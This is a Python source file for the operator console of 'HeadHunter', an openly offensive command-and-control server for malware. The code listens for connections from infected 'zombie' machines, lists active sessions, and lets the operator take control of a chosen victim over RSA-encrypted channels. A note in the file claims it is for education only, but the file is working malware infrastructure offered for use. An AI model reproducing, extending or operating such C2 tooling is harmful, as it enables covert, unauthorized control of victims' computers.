# HeadHunter (C2) server
# Author: Logan Goins
# I am not liable for any misuse of this software.
# This software is for educational purposes only



import readline
from src import server
import sys 
import rsa

print(
'''
  
 ██░ ██ ▓█████ ▄▄▄      ▓█████▄  ██░ ██  █    ██  ███▄    █ ▄▄▄█████▓▓█████  ██▀███  
▓██░ ██▒▓█   ▀▒████▄    ▒██▀ ██▌▓██░ ██▒ ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
▒██▀▀██░▒███  ▒██  ▀█▄  ░██   █▌▒██▀▀██░▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
░▓█ ░██ ▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌░▓█ ░██ ▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
░▓█▒░██▓░▒████▒▓█   ▓██▒░▒████▓ ░▓█▒░██▓▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒
 ▒ ░░▒░▒░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒  ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒ ░▒░ ░ ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒  ▒ ░▒░ ░░░▒░ ░ ░ ░ ░░   ░ ▒░    ░     ░ ░  ░  ░▒ ░ ▒░
 ░  ░░ ░   ░    ░   ▒    ░ ░  ░  ░  ░░ ░ ░░░ ░ ░    ░   ░ ░   ░         ░     ░░   ░ 
 ░  ░  ░   ░  ░     ░  ░   ░     ░  ░  ░   ░              ░             ░  ░   ░     
                         ░                                                           

Command and Control Server (C2)
Author: Logan Goins

type \'help\' for available commands
''')


readline.set_auto_history(True)
while True:
	command = input("HeadHunter/> ").lower().split(" ")
	print(" ")
	if len(command) >= 3:
		cmd = command[0]
		subcmd = command[1]
		arg = command[2]
	elif len(command) >= 2:
		cmd = command[0]
		subcmd = command[1]
	elif len(command) >= 1:
		cmd = command[0]
		params = [cmd]

	
	if cmd == "listen":
		server.listen(subcmd, int(arg))

	elif cmd == "help":
		print('''
			                       Commands
------------------------------------------------------------------------------------------------------
help                      --          displays this menu
listen <LHOST> <LPORT>    --	      starts listening for zombies on the specified local address and port
show connections	  -- 	      displays active zombie connections by address and source port
exit                      --          exits the headhunter interactive shell
control <session>         --          controls an infected zombie by session number

		''')

	elif cmd == "control":
		
		try:
			zombie = server.c[int(subcmd)-1]
			zombiepubkey = server.public_partner[int(subcmd)-1]
			hello = "\n"
			zombie.send(rsa.encrypt(hello.encode(), zombiepubkey))
			print("Entering control mode for zombie " + subcmd + " on address " + str(zombie.getpeername()))
			server.control(zombie, zombiepubkey)	
		except OSError:
			print("Zombie is currently disconnected on selected session")

	elif cmd == "show" and subcmd == "connections":
		
		try:
			session = 0
			for i in server.c:
				if(i != None):
					session+=1
					print("session " + str(session) + " connected on address: " + str(i.getpeername()))
			print()	
		
		except AttributeError:
			print("Server hasn't started yet. Type \"listen <LHOST> <LPORT>\" to start listening for connections\n")
		
		except OSError:
			print("No zombies are currently connected\n")

	elif cmd == "exit":
		exit()

	else:
		print("Invalid command, type \"help\" for a list of commands\n")
